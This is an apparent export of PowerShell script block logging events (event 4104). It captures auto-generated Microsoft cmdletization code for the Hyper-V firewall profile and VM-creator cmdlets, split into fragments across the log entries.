            $__cmdletization_objectModelWrapper.BeginProcessing()
        }
        catch
        {
            $__cmdletization_exceptionHasBeenThrown = $true
            throw
        }
    }
        

    Process {
        try 
        {
            if (-not $__cmdletization_exceptionHasBeenThrown)
            {
      $__cmdletization_methodParameters = [System.Collections.Generic.List[Microsoft.PowerShell.Cmdletization.MethodParameter]]::new()

        [object]$__cmdletization_defaultValue = $null
        [object]$__cmdletization_defaultValueIsPresent = $false
        if ($PSBoundParameters.ContainsKey('PolicyStore')) {
          [object]$__cmdletization_value = ${PolicyStore}
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'cim:OperationOption:PolicyStore'; ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
        } else {
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'cim:OperationOption:PolicyStore'; ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
        }
        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

        [object]$__cmdletization_defaultValue = $null
        [object]$__cmdletization_defaultValueIsPresent = $false
        if ($PSBoundParameters.ContainsKey('GPOSession')) {
          [object]$__cmdletization_value = ${GPOSession}
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'cim:OperationOption:GPOSession'; ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
        } else {
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'cim:OperationOption:GPOSession'; ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
        }
        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

        [object]$__cmdletization_defaultValue = $null
        [object]$__cmdletization_defaultValueIsPresent = $false
        if ($PSBoundParameters.ContainsKey('Name')) {
          [object]$__cmdletization_value = ${Name}
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'Name'; ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
        } else {
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'Name'; ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
        }
        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

        [object]$__cmdletization_defaultValue = $null
        [object]$__cmdletization_defaultValueIsPresent = $false
        if ($PSBoundParameters.ContainsKey('Enabled')) {
          [object]$__cmdletization_value = ${Enabled}
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'Enabled'; ParameterType = 'Microsoft.PowerShell.Cmdletization.GeneratedTypes.NetSecurity.GpoBoolean'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
        } else {
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'Enabled'; ParameterType = 'Microsoft.PowerShell.Cmdletization.GeneratedTypes.NetSecurity.GpoBoolean'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
        }
        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

        [object]$__cmdletization_defaultValue = $null
        [object]$__cmdletization_defaultValueIsPresent = $false
        if ($PSBoundParameters.ContainsKey('DefaultInboundAction')) {
          [object]$__cmdletization_value = ${DefaultInboundAction}
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'DefaultInboundAction'; ParameterType = 'Microsoft.PowerShell.Cmdletization.GeneratedTypes.NetSecurity.Action'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
        } else {
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'DefaultInboundAction'; ParameterType = 'Microsoft.PowerShell.Cmdletization.GeneratedTypes.NetSecurity.Action'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
        }
        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

        [object]$__cmdletization_defaultValue = $null
        [object]$__cmdletization_defaultValueIsPresent = $false
        if ($PSBoundParameters.ContainsKey('DefaultOutboundAction')) {
          [object]$__cmdletization_value = ${DefaultOutboundAction}
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'DefaultOutboundAction'; ParameterType = 'Microsoft.PowerShell.Cmdletization.GeneratedTypes.NetSecurity.Action'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
        } else {
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'DefaultOutboundAction'; ParameterType = 'Microsoft.PowerShell.Cmdletization.GeneratedTypes.NetSecurity.Action'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
        }
        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

        [object]$__cmdletization_defaultValue = $null
        [object]$__cmdletization_defaultValueIsPresent = $false
        if ($PSBoundParameters.ContainsKey('LoopbackEnabled')) {
          [object]$__cmdletization_value = ${LoopbackEnabled}
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'LoopbackEnabled'; ParameterType = 'Microsoft.PowerShell.Cmdletization.GeneratedTypes.NetSecurity.GpoBoolean'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
        } else {
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'LoopbackEnabled'; ParameterType = 'Microsoft.PowerShell.Cmdletization.GeneratedTypes.NetSecurity.GpoBoolean'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
        }
        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

        [object]$__cmdletization_defaultValue = $null
        [object]$__cmdletization_defaultValueIsPresent = $false
        if ($PSBoundParameters.ContainsKey('AllowHostPolicyMerge')) {
          [object]$__cmdletization_value = ${AllowHostPolicyMerge}
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'AllowHostPolicyMerge'; ParameterType = 'Microsoft.PowerShell.Cmdletization.GeneratedTypes.NetSecurity.G

ScriptBlock ID: cdab0656-a077-4f5e-b51b-05bcbd0a80eb
Path: "
"07-08-2025 18:31:35","4104","Warning","Creating Scriptblock text (1 of 1):

#requires -version 3.0

try { Microsoft.PowerShell.Core\Set-StrictMode -Off } catch { }

$script:MyModule = $MyInvocation.MyCommand.ScriptBlock.Module

$script:ClassName = 'root/standardcimv2/MSFT_NetFirewallHyperVVMCreator'
$script:ClassVersion = '1.0.0'
$script:ModuleVersion = '1.0.0.0'
$script:ObjectModelWrapper = [Microsoft.PowerShell.Cmdletization.Cim.CimCmdletAdapter]

$script:PrivateData = [System.Collections.Generic.Dictionary[string,string]]::new()

Microsoft.PowerShell.Core\Export-ModuleMember -Function @()
        

function __cmdletization_BindCommonParameters
{
    param(
        $__cmdletization_objectModelWrapper,
        $myPSBoundParameters
    )       
                

        if ($myPSBoundParameters.ContainsKey('CimSession')) { 
            $__cmdletization_objectModelWrapper.PSObject.Properties['CimSession'].Value = $myPSBoundParameters['CimSession'] 
        }
                    

        if ($myPSBoundParameters.ContainsKey('ThrottleLimit')) { 
            $__cmdletization_objectModelWrapper.PSObject.Properties['ThrottleLimit'].Value = $myPSBoundParameters['ThrottleLimit'] 
        }
                    

        if ($myPSBoundParameters.ContainsKey('AsJob')) { 
            $__cmdletization_objectModelWrapper.PSObject.Properties['AsJob'].Value = $myPSBoundParameters['AsJob'] 
        }
                    

}
                

function Get-NetFirewallHyperVVMCreator
{
    [CmdletBinding(DefaultParameterSetName='GetAll', PositionalBinding=$false)]
    
    [OutputType([Microsoft.Management.Infrastructure.CimInstance])]
[OutputType('Microsoft.Management.Infrastructure.CimInstance#root/standardcimv2/MSFT_NetFirewallHyperVVMCreator')]

    param(
    
    [Parameter(ParameterSetName='ByVMCreatorId', Mandatory=$true, Position=0)]
    [ValidateNotNull()]
    [string[]]
    ${VMCreatorId},

    [Parameter(ParameterSetName='GetAll')]
    [switch]
    ${All},

    [Parameter(ParameterSetName='ByVMCreatorId')]
    [Parameter(ParameterSetName='GetAll')]
    [Alias('Session')]
    [ValidateNotNullOrEmpty()]
    [CimSession[]]
    ${CimSession},

    [Parameter(ParameterSetName='ByVMCreatorId')]
    [Parameter(ParameterSetName='GetAll')]
    [int]
    ${ThrottleLimit},

    [Parameter(ParameterSetName='ByVMCreatorId')]
    [Parameter(ParameterSetName='GetAll')]
    [switch]
    ${AsJob})

    DynamicParam {
        try 
        {
            if (-not $__cmdletization_exceptionHasBeenThrown)
            {
                $__cmdletization_objectModelWrapper = $script:ObjectModelWrapper::new()
                $__cmdletization_objectModelWrapper.Initialize($PSCmdlet, $script:ClassName, $script:ClassVersion, $script:ModuleVersion, $script:PrivateData)

                if ($__cmdletization_objectModelWrapper -is [System.Management.Automation.IDynamicParameters])
                {
                    ([System.Management.Automation.IDynamicParameters]$__cmdletization_objectModelWrapper).GetDynamicParameters()
                }
            }
        }
        catch
        {
            $__cmdletization_exceptionHasBeenThrown = $true
            throw
        }
    }

    Begin {
        $__cmdletization_exceptionHasBeenThrown = $false
        try 
        {
            __cmdletization_BindCommonParameters $__cmdletization_objectModelWrapper $PSBoundParameters
            $__cmdletization_objectModelWrapper.BeginProcessing()
        }
        catch
        {
            $__cmdletization_exceptionHasBeenThrown = $true
            throw
        }
    }
        

    Process {
        try 
        {
            if (-not $__cmdletization_exceptionHasBeenThrown)
            {
    $__cmdletization_queryBuilder = $__cmdletization_objectModelWrapper.GetQueryBuilder()
    if ($PSBoundParameters.ContainsKey('VMCreatorId') -and (@('ByVMCreatorId') -contains $PSCmdlet.ParameterSetName )) {
        $__cmdletization_values = @(${VMCreatorId})
        $__cmdletization_queryBuilder.FilterByProperty('VMCreatorId', $__cmdletization_values, $true, 'Default')
    }
    if ($PSBoundParameters.ContainsKey('All') -and (@('GetAll') -contains $PSCmdlet.ParameterSetName )) {
    $__cmdletization_queryBuilder.AddQueryOption('All', ${All})
    }


    $__cmdletization_objectModelWrapper.ProcessRecord($__cmdletization_queryBuilder)
            }
        }
        catch
        {
            $__cmdletization_exceptionHasBeenThrown = $true
            throw
        }
    }
        

    End {
        try
        {
            if (-not $__cmdletization_exceptionHasBeenThrown)
            {
                $__cmdletization_objectModelWrapper.EndProcessing()
            }
        }
        catch
        {
            throw
        }
    }

    # .EXTERNALHELP NetFirewallHyperVVMCreator.cmdletDefinition.cdxml-Help.xml
}
Microsoft.PowerShell.Core\Export-ModuleMember -Function 'Get-NetFirewallHyperVVMCreator' -Alias '*'
        


ScriptBlock ID: b107dd69-3a5d-487e-b35d-2aa57a7b3b64
Path: "
"07-08-2025 18:31:35","4104","Warning","Creating Scriptblock text (3 of 3):
       [object]$__cmdletization_defaultValueIsPresent = $false
          if ($PSBoundParameters.ContainsKey('AllowLocalFirewallRules')) {
            [object]$__cmdletization_value = ${AllowLocalFirewallRules}
            $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'AllowLocalFirewallRules'; ParameterType = 'Microsoft.PowerShell.Cmdletization.GeneratedTypes.NetSecurity.GpoBoolean'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
          } else {
            $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'AllowLocalFirewallRules'; ParameterType = 'Microsoft.PowerShell.Cmdletization.GeneratedTypes.NetSecurity.GpoBoolean'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
          }
          $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

      $__cmdletization_returnValue = $null
      $__cmdletization_methodInvocationInfo = [Microsoft.PowerShell.Cmdletization.MethodInvocationInfo]::new('cim:ModifyInstance', $__cmdletization_methodParameters, $__cmdletization_returnValue)
      $__cmdletization_passThru = $PSBoundParameters.ContainsKey('PassThru') -and $PassThru
            if ($PSBoundParameters.ContainsKey('InputObject')) {
                foreach ($x in $InputObject) { $__cmdletization_objectModelWrapper.ProcessRecord($x, $__cmdletization_methodInvocationInfo, $__cmdletization_PassThru) }
            } else {
                $__cmdletization_objectModelWrapper.ProcessRecord($__cmdletization_queryBuilder, $__cmdletization_methodInvocationInfo, $__cmdletization_PassThru)
            }
        }
    }

            }
        }
        catch
        {
            $__cmdletization_exceptionHasBeenThrown = $true
            throw
        }
    }
        

    End {
        try
        {
            if (-not $__cmdletization_exceptionHasBeenThrown)
            {
                $__cmdletization_objectModelWrapper.EndProcessing()
            }
        }
        catch
        {
            throw
        }
    }

    # .EXTERNALHELP NetFirewallHyperVProfile.cmdletDefinition.cdxml-Help.xml
}
Microsoft.PowerShell.Core\Export-ModuleMember -Function 'Set-NetFirewallHyperVProfile' -Alias '*'
        

function Remove-NetFirewallHyperVProfile
{
    [CmdletBinding(DefaultParameterSetName='GetAll', SupportsShouldProcess=$true, ConfirmImpact='Medium', PositionalBinding=$false)]
    
    [OutputType([Microsoft.Management.Infrastructure.CimInstance])]
[OutputType('Microsoft.Management.Infrastructure.CimInstance#root/standardcimv2/MSFT_NetFirewallHyperVProfile')]

    param(
    
    [Parameter(ParameterSetName='ByQuery', Position=0)]
    [Alias('VMCreatorId')]
    [ValidateNotNull()]
    [string[]]
    ${Name},

    [Parameter(ParameterSetName='ByQuery')]
    [ValidateNotNull()]
    [Microsoft.PowerShell.Cmdletization.GeneratedTypes.NetSecurity.Profile[]]
    ${Profile},

    [Parameter(ParameterSetName='ByQuery')]
    [ValidateNotNull()]
    [Microsoft.PowerShell.Cmdletization.GeneratedTypes.NetSecurity.GpoBoolean[]]
    ${Enabled},

    [Parameter(ParameterSetName='ByQuery')]
    [ValidateNotNull()]
    [Microsoft.PowerShell.Cmdletization.GeneratedTypes.NetSecurity.Action[]]
    ${DefaultInboundAction},

    [Parameter(ParameterSetName='ByQuery')]
    [ValidateNotNull()]
    [Microsoft.PowerShell.Cmdletization.GeneratedTypes.NetSecurity.Action[]]
    ${DefaultOutboundAction},

    [Parameter(ParameterSetName='ByQuery')]
    [ValidateNotNull()]
    [Microsoft.PowerShell.Cmdletization.GeneratedTypes.NetSecurity.GpoBoolean[]]
    ${AllowLocalFirewallRules},

    [Parameter(ParameterSetName='GetAll')]
    [switch]
    ${All},

    [Parameter(ParameterSetName='ByQuery')]
    [Parameter(ParameterSetName='GetAll')]
    [string]
    ${PolicyStore},

    [Parameter(ParameterSetName='InputObject (cdxml)', Mandatory=$true, ValueFromPipeline=$true)]
    [PSTypeName('Microsoft.Management.Infrastructure.CimInstance#MSFT_NetFirewallHyperVProfile')]
    [ValidateNotNull()]
    [ciminstance[]]
    ${InputObject},

    [Parameter(ParameterSetName='ByQuery')]
    [Parameter(ParameterSetName='GetAll')]
    [Parameter(ParameterSetName='InputObject (cdxml)')]
    [Alias('Session')]
    [ValidateNotNullOrEmpty()]
    [CimSession[]]
    ${CimSession},

    [Parameter(ParameterSetName='ByQuery')]
    [Parameter(ParameterSetName='GetAll')]
    [Parameter(ParameterSetName='InputObject (cdxml)')]
    [int]
    ${ThrottleLimit},

    [Parameter(ParameterSetName='ByQuery')]
    [Parameter(ParameterSetName='GetAll')]
    [Parameter(ParameterSetName='InputObject (cdxml)')]
    [switch]
    ${AsJob},

    [Parameter(ParameterSetName='ByQuery')]
    [Parameter(ParameterSetName='GetAll')]
    [Parameter(ParameterSetName='InputObject (cdxml)')]
    [switch]
    ${PassThru})

    DynamicParam {
        try 
        {
            if (-not $__cmdletization_exceptionHasBeenThrown)
            {
                $__cmdletization_objectModelWrapper = $script:ObjectModelWrapper::new()
                $__cmdletization_objectModelWrapper.Initialize($PSCmdlet, $script:ClassName, $script:ClassVersion, $script:ModuleVersion, $script:PrivateData)

                if ($__cmdletization_objectModelWrapper -is [System.Management.Automation.IDynamicParameters])
                {
                    ([System.Management.Automation.IDynamicParameters]$__cmdletization_objectModelWrapper).GetDynamicParameters()
                }
            }
        }
        catch
        {
            $__cmdletization_exceptionHasBeenThrown = $true
            throw
        }
    }

    Begin {
        $__cmdletization_exceptionHasBeenThrown = $false
        try 
        {
            __cmdletization_BindCommonParameters $__cmdletization_objectModelWrapper $PSBoundParameters
            $__cmdletization_objectModelWrapper.BeginProcessing()
        }
        catch
        {
            $__cmdletization_exceptionHasBeenThrown = $true
            throw
        }
    }
        

    Process {
        try 
        {
            if (-not $__cmdletization_exceptionHasBeenThrown)
            {
    $__cmdletization_queryBuilder = $__cmdletization_objectModelWrapper.GetQueryBuilder()
    if ($PSBoundParameters.ContainsKey('Name') -and (@('ByQuery') -contains $PSCmdlet.ParameterSetName )) {
        $__cmdletization_values = @(${Name})
        $__cmdletization_queryBuilder.FilterByProperty('Name', $__cmdletization_values, $true, 'Default')
    }
    if ($PSBoundParameters.ContainsKey('Profile') -and (@('ByQuery') -contains $PSCmdlet.ParameterSetName )) {
        $__cmdletization_values = @(${Profile})
        $__cmdletization_queryBuilder.FilterByProperty('Profile', $__cmdletization_values, $false, 'Default')
    }
    if ($PSBoundParameters.ContainsKey('Enabled') -and (@('ByQuery') -contains $PSCmdlet.ParameterSetName )) {
        $__cmdletization_values = @(${Enabled})
        $__cmdletization_queryBuilder.FilterByProperty('Enabled', $__cmdletization_values, $false, 'Default')
    }
    if ($PSBoundParameters.ContainsKey('DefaultInboundAction') -and (@('ByQuery') -contains $PSCmdlet.ParameterSetName )) {
        $__cmdletization_values = @(${DefaultInboundAction})
        $__cmdletization_queryBuilder.FilterByProperty('DefaultInboundAction', $__cmdletization_values, $false, 'Default')
    }
    if ($PSBoundParameters.ContainsKey('DefaultOutboundAction') -and (@('ByQuery') -contains $PSCmdlet.ParameterSetName )) {
        $__cmdletization_values = @(${DefaultOutboundAction})
        $__cmdletization_queryBuilder.FilterByProperty('DefaultOutboundAction', $__cmdletization_values, $false, 'Default')
    }
    if ($PSBoundParameters.ContainsKey('AllowLocalFirewallRules') -and (@('ByQuery') -contains $PSCmdlet.ParameterSetName )) {
        $__cmdletization_values = @(${AllowLocalFirewallRules})
        $__cmdletization_queryBuilder.FilterByProperty('AllowLocalFirewallRules', $__cmdletization_values, $false, 'Default')
    }
    if ($PSBoundParameters.ContainsKey('All') -and (@('GetAll') -contains $PSCmdlet.ParameterSetName )) {
    $__cmdletization_queryBuilder.AddQueryOption('All', ${All})
    }
    if ($PSBoundParameters.ContainsKey('PolicyStore') -and (@('ByQuery', 'GetAll') -contains $PSCmdlet.ParameterSetName )) {
    $__cmdletization_queryBuilder.AddQueryOption('PolicyStore', ${PolicyStore})
    }


    $__cmdletization_methodParameters = [System.Collections.Generic.List[Microsoft.PowerShell.Cmdletization.MethodParameter]]::new()
    switch -exact ($PSCmdlet.ParameterSetName) { 
        { @('ByQuery', 'GetAll', 'InputObject (cdxml)') -contains $_ } {
      $__cmdletization_returnValue = $null
      $__cmdletization_methodInvocationInfo = [Microsoft.PowerShell.Cmdletization.MethodInvocationInfo]::new('cim:DeleteInstance', $__cmdletization_methodParameters, $__cmdletization_returnValue)
      $__cmdletization_passThru = $PSBoundParameters.ContainsKey('PassThru') -and $PassThru
            if ($PSBoundParameters.ContainsKey('InputObject')) {
                foreach ($x in $InputObject) { $__cmdletization_objectModelWrapper.ProcessRecord($x, $__cmdletization_methodInvocationInfo, $__cmdletization_PassThru) }
            } else {
                $__cmdletization_objectModelWrapper.ProcessRecord($__cmdletization_queryBuilder, $__cmdletization_methodInvocationInfo, $__cmdletization_PassThru)
            }
        }
    }

            }
        }
        catch
        {
            $__cmdletization_exceptionHasBeenThrown = $true
            throw
        }
    }
        

    End {
        try
        {
            if (-not $__cmdletization_exceptionHasBeenThrown)
            {
                $__cmdletization_objectModelWrapper.EndProcessing()
            }
        }
        catch
        {
            throw
        }
    }

    # .EXTERNALHELP NetFirewallHyperVProfile.cmdletDefinition.cdxml-Help.xml
}
Microsoft.PowerShell.Core\Export-ModuleMember -Function 'Remove-NetFirewallHyperVProfile' -Alias '*'
        


ScriptBlock ID: 0153011a-3ea2-4323-8856-76307efc78a4
Path: "
"07-08-2025 18:31:35","4104","Warning","Creating Scriptblock text (2 of 3):
   [Parameter(ParameterSetName='GetAll')]
    [switch]
    ${All},

    [Parameter(ParameterSetName='ByQuery')]
    [Parameter(ParameterSetName='GetAll')]
    [string]
    ${PolicyStore},

    [Parameter(ParameterSetName='ByQuery')]
    [Parameter(ParameterSetName='GetAll')]
    [Alias('Session')]
    [ValidateNotNullOrEmpty()]
    [CimSession[]]
    ${CimSession},

    [Parameter(ParameterSetName='ByQuery')]
    [Parameter(ParameterSetName='GetAll')]
    [int]
    ${ThrottleLimit},

    [Parameter(ParameterSetName='ByQuery')]
    [Parameter(ParameterSetName='GetAll')]
    [switch]
    ${AsJob})

    DynamicParam {
        try 
        {
            if (-not $__cmdletization_exceptionHasBeenThrown)
            {
                $__cmdletization_objectModelWrapper = $script:ObjectModelWrapper::new()
                $__cmdletization_objectModelWrapper.Initialize($PSCmdlet, $script:ClassName, $script:ClassVersion, $script:ModuleVersion, $script:PrivateData)

                if ($__cmdletization_objectModelWrapper -is [System.Management.Automation.IDynamicParameters])
                {
                    ([System.Management.Automation.IDynamicParameters]$__cmdletization_objectModelWrapper).GetDynamicParameters()
                }
            }
        }
        catch
        {
            $__cmdletization_exceptionHasBeenThrown = $true
            throw
        }
    }

    Begin {
        $__cmdletization_exceptionHasBeenThrown = $false
        try 
        {
            __cmdletization_BindCommonParameters $__cmdletization_objectModelWrapper $PSBoundParameters
            $__cmdletization_objectModelWrapper.BeginProcessing()
        }
        catch
        {
            $__cmdletization_exceptionHasBeenThrown = $true
            throw
        }
    }
        

    Process {
        try 
        {
            if (-not $__cmdletization_exceptionHasBeenThrown)
            {
    $__cmdletization_queryBuilder = $__cmdletization_objectModelWrapper.GetQueryBuilder()
    if ($PSBoundParameters.ContainsKey('Name') -and (@('ByQuery') -contains $PSCmdlet.ParameterSetName )) {
        $__cmdletization_values = @(${Name})
        $__cmdletization_queryBuilder.FilterByProperty('Name', $__cmdletization_values, $true, 'Default')
    }
    if ($PSBoundParameters.ContainsKey('Profile') -and (@('ByQuery') -contains $PSCmdlet.ParameterSetName )) {
        $__cmdletization_values = @(${Profile})
        $__cmdletization_queryBuilder.FilterByProperty('Profile', $__cmdletization_values, $false, 'Default')
    }
    if ($PSBoundParameters.ContainsKey('Enabled') -and (@('ByQuery') -contains $PSCmdlet.ParameterSetName )) {
        $__cmdletization_values = @(${Enabled})
        $__cmdletization_queryBuilder.FilterByProperty('Enabled', $__cmdletization_values, $false, 'Default')
    }
    if ($PSBoundParameters.ContainsKey('DefaultInboundAction') -and (@('ByQuery') -contains $PSCmdlet.ParameterSetName )) {
        $__cmdletization_values = @(${DefaultInboundAction})
        $__cmdletization_queryBuilder.FilterByProperty('DefaultInboundAction', $__cmdletization_values, $false, 'Default')
    }
    if ($PSBoundParameters.ContainsKey('DefaultOutboundAction') -and (@('ByQuery') -contains $PSCmdlet.ParameterSetName )) {
        $__cmdletization_values = @(${DefaultOutboundAction})
        $__cmdletization_queryBuilder.FilterByProperty('DefaultOutboundAction', $__cmdletization_values, $false, 'Default')
    }
    if ($PSBoundParameters.ContainsKey('AllowLocalFirewallRules') -and (@('ByQuery') -contains $PSCmdlet.ParameterSetName )) {
        $__cmdletization_values = @(${AllowLocalFirewallRules})
        $__cmdletization_queryBuilder.FilterByProperty('AllowLocalFirewallRules', $__cmdletization_values, $false, 'Default')
    }
    if ($PSBoundParameters.ContainsKey('All') -and (@('GetAll') -contains $PSCmdlet.ParameterSetName )) {
    $__cmdletization_queryBuilder.AddQueryOption('All', ${All})
    }
    if ($PSBoundParameters.ContainsKey('PolicyStore') -and (@('ByQuery', 'GetAll') -contains $PSCmdlet.ParameterSetName )) {
    $__cmdletization_queryBuilder.AddQueryOption('PolicyStore', ${PolicyStore})
    }


    $__cmdletization_objectModelWrapper.ProcessRecord($__cmdletization_queryBuilder)
            }
        }
        catch
        {
            $__cmdletization_exceptionHasBeenThrown = $true
            throw
        }
    }
        

    End {
        try
        {
            if (-not $__cmdletization_exceptionHasBeenThrown)
            {
                $__cmdletization_objectModelWrapper.EndProcessing()
            }
        }
        catch
        {
            throw
        }
    }

    # .EXTERNALHELP NetFirewallHyperVProfile.cmdletDefinition.cdxml-Help.xml
}
Microsoft.PowerShell.Core\Export-ModuleMember -Function 'Get-NetFirewallHyperVProfile' -Alias '*'
        

function Set-NetFirewallHyperVProfile
{
    [CmdletBinding(SupportsShouldProcess=$true, ConfirmImpact='Medium', PositionalBinding=$false)]
    
    [OutputType([Microsoft.Management.Infrastructure.CimInstance])]
[OutputType('Microsoft.Management.Infrastructure.CimInstance#root/standardcimv2/MSFT_NetFirewallHyperVProfile')]

    param(
    
    [Parameter(ParameterSetName='ByName', Mandatory=$true, Position=0)]
    [Alias('VMCreatorId')]
    [ValidateNotNull()]
    [string[]]
    ${Name},

    [Parameter(ParameterSetName='GetAll')]
    [switch]
    ${All},

    [Parameter(ParameterSetName='ByName')]
    [Parameter(ParameterSetName='GetAll')]
    [string]
    ${PolicyStore},

    [Parameter(ParameterSetName='InputObject (cdxml)', Mandatory=$true, ValueFromPipeline=$true)]
    [PSTypeName('Microsoft.Management.Infrastructure.CimInstance#MSFT_NetFirewallHyperVProfile')]
    [ValidateNotNull()]
    [ciminstance[]]
    ${InputObject},

    [Parameter(ParameterSetName='ByName')]
    [Parameter(ParameterSetName='GetAll')]
    [Parameter(ParameterSetName='InputObject (cdxml)')]
    [Microsoft.PowerShell.Cmdletization.GeneratedTypes.NetSecurity.Profile]
    ${Profile},

    [Parameter(ParameterSetName='ByName')]
    [Parameter(ParameterSetName='GetAll')]
    [Parameter(ParameterSetName='InputObject (cdxml)')]
    [Microsoft.PowerShell.Cmdletization.GeneratedTypes.NetSecurity.GpoBoolean]
    ${Enabled},

    [Parameter(ParameterSetName='ByName')]
    [Parameter(ParameterSetName='GetAll')]
    [Parameter(ParameterSetName='InputObject (cdxml)')]
    [Microsoft.PowerShell.Cmdletization.GeneratedTypes.NetSecurity.Action]
    ${DefaultInboundAction},

    [Parameter(ParameterSetName='ByName')]
    [Parameter(ParameterSetName='GetAll')]
    [Parameter(ParameterSetName='InputObject (cdxml)')]
    [Microsoft.PowerShell.Cmdletization.GeneratedTypes.NetSecurity.Action]
    ${DefaultOutboundAction},

    [Parameter(ParameterSetName='ByName')]
    [Parameter(ParameterSetName='GetAll')]
    [Parameter(ParameterSetName='InputObject (cdxml)')]
    [Microsoft.PowerShell.Cmdletization.GeneratedTypes.NetSecurity.GpoBoolean]
    ${AllowLocalFirewallRules},

    [Parameter(ParameterSetName='ByName')]
    [Parameter(ParameterSetName='GetAll')]
    [Parameter(ParameterSetName='InputObject (cdxml)')]
    [Alias('Session')]
    [ValidateNotNullOrEmpty()]
    [CimSession[]]
    ${CimSession},

    [Parameter(ParameterSetName='ByName')]
    [Parameter(ParameterSetName='GetAll')]
    [Parameter(ParameterSetName='InputObject (cdxml)')]
    [int]
    ${ThrottleLimit},

    [Parameter(ParameterSetName='ByName')]
    [Parameter(ParameterSetName='GetAll')]
    [Parameter(ParameterSetName='InputObject (cdxml)')]
    [switch]
    ${AsJob},

    [Parameter(ParameterSetName='ByName')]
    [Parameter(ParameterSetName='GetAll')]
    [Parameter(ParameterSetName='InputObject (cdxml)')]
    [switch]
    ${PassThru})

    DynamicParam {
        try 
        {
            if (-not $__cmdletization_exceptionHasBeenThrown)
            {
                $__cmdletization_objectModelWrapper = $script:ObjectModelWrapper::new()
                $__cmdletization_objectModelWrapper.Initialize($PSCmdlet, $script:ClassName, $script:ClassVersion, $script:ModuleVersion, $script:PrivateData)

                if ($__cmdletization_objectModelWrapper -is [System.Management.Automation.IDynamicParameters])
                {
                    ([System.Management.Automation.IDynamicParameters]$__cmdletization_objectModelWrapper).GetDynamicParameters()
                }
            }
        }
        catch
        {
            $__cmdletization_exceptionHasBeenThrown = $true
            throw
        }
    }

    Begin {
        $__cmdletization_exceptionHasBeenThrown = $false
        try 
        {
            __cmdletization_BindCommonParameters $__cmdletization_objectModelWrapper $PSBoundParameters
            $__cmdletization_objectModelWrapper.BeginProcessing()
        }
        catch
        {
            $__cmdletization_exceptionHasBeenThrown = $true
            throw
        }
    }
        

    Process {
        try 
        {
            if (-not $__cmdletization_exceptionHasBeenThrown)
            {
    $__cmdletization_queryBuilder = $__cmdletization_objectModelWrapper.GetQueryBuilder()
    if ($PSBoundParameters.ContainsKey('Name') -and (@('ByName') -contains $PSCmdlet.ParameterSetName )) {
        $__cmdletization_values = @(${Name})
        $__cmdletization_queryBuilder.FilterByProperty('Name', $__cmdletization_values, $true, 'Default')
    }
    if ($PSBoundParameters.ContainsKey('All') -and (@('GetAll') -contains $PSCmdlet.ParameterSetName )) {
    $__cmdletization_queryBuilder.AddQueryOption('All', ${All})
    }
    if ($PSBoundParameters.ContainsKey('PolicyStore') -and (@('ByName', 'GetAll') -contains $PSCmdlet.ParameterSetName )) {
    $__cmdletization_queryBuilder.AddQueryOption('PolicyStore', ${PolicyStore})
    }


    $__cmdletization_methodParameters = [System.Collections.Generic.List[Microsoft.PowerShell.Cmdletization.MethodParameter]]::new()
    switch -exact ($PSCmdlet.ParameterSetName) { 
